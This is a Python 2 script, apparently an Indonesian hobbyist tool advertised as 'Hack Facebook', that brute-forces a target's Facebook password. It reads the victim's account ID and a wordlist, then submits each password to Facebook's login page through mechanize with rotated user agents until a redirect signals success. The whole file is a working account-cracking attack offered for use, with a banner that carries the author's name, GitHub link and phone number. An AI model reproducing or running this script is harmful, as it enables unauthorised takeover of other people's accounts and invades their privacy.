#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os
import sys
import mechanize
import cookielib
import random
import time

os.system('clear')

def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

if sys.platform == "linux" or sys.platform == "linux2":
     GL = "\033[96;1m" # Blue aqua
     BB = "\033[34;1m" # Blue light
     YY = "\033[33;1m" # Yellow light
     GG = "\033[32;1m" # Green light
     WW = "\033[0;1m"  # White light
     RR = "\033[31;1m" # Red light
     CC = "\033[36;1m" # Cyan light
     B = "\033[34m"    # Blue
     Y = "\033[33;1m"    # Yellow
     G = "\033[32m"    # Green
     W = "\033[0;1m"     # White
     R = "\033[31m"    # Red
     C = "\033[36;1m"    # Cyan
     rand = (BB,YY,GG,WW,RR,CC)
     P = random.choice(rand)
def cover():
    print """
    
    
    
    
     """
    runntek(GL+"      [-_-] HALLO BANGSAT [-_-]")
    time.sleep(1)
    print " "
    print WW+"      ▄▄"
    print WW+"     █░░█"+GL+"       AUTHOR : "+R+" Riski Darmawan"
    print WW+"     █░░█"+GL+"       GITHUB : "+R+" https://github.com/FR13ND8"
    print WW+"▄▄▄▄▄█░░█▄▄▄"+GL+"    WA     : "+R+" 085835787069"
    print B+"▓▓▓▓"+WW+"█░░░░░░░█"+GL+"   FUNGSI : "+R+" Hack Facebook Narget"
    print B+"▓▓▓▓"+WW+"█░░░░░░░░█"
    print B+"▓▓▓▓"+WW+"█░░░░░░░░█"+GL+"   >> "+R+" JANGAN RECODE YA BANGSAT"
    print B+"▓▓▓▓"+WW+"█░░░░░░░░█"+GL+"   >> "+R+" CAPEK GUA BUATNYA BANGSAT"
    print WW+"███▀▀▀███████"
    print WW+" "


cover()

email = str(raw_input(GG+"[?]"+YY+" Masukkan ID Target"+B+" : "))

passwordlist = str(raw_input(GG+"[?]"+YY+" KETIK password.txt"+B+" : "))


#login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]


def runntek(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 100)

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        lagi()
        search()
        print " "
        runntek(R+"MAAF PASSWORD TIDAK DI TEMUKAN")
        runntek(R+"BUATLAH LAGI password/Wordlist Kamu")
        time.sleep(1)
        print WW+3*"[-_-] "

def brute(password):
        sys.stdout.write(W+"\r[+]  Mencoba..... {}".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print ("\033[92;1m\n\n[+]\033[97;1m INI ADALAH PASSWORDNYA \033[31;1m===> \033[96;1m{}".format(password))
                        print " "
                        raw_input(CC+"......TEKAN ENTER UNTUK KELUAR.....")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                passwords = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        print GG+"""
     ╔════════════════════════════════════╗
     ‖  INDONESIA DARK TERMUX ASSOCIATE   ‖
     ╚════════════════════════════════════╝
     |    ╔╗╔╗╔══╗╔═╗╔╦╗     ╔══╗╔══╗     |
     |    ║╚╝║║╔╗║║╔╝║╔╝     ║═╦╝║╔╗║     |
     |    ║╔╗║║╠╣║║╚╗║╚╗     ║╔╝ ║╔╗║     |
     |    ╚╝╚╝╚╝╚╝╚═╝╚╩╝     ╚╝  ╚══╝     |
     |════════════════════════════════════|
      """
def lagi():
       total = open(passwordlist,"r")
       total = total.readlines()
       print WW+"     [*] Account to crack : {}".format(email)
       print WW+"     [*] JUMLAH WORDLIST  :" , len(total),WW+ "passwords"
       print WW+"     [*] LAGI CRACKING MOHON TUNGGU .....\n\n"

if __name__ == '__main__':
        main()
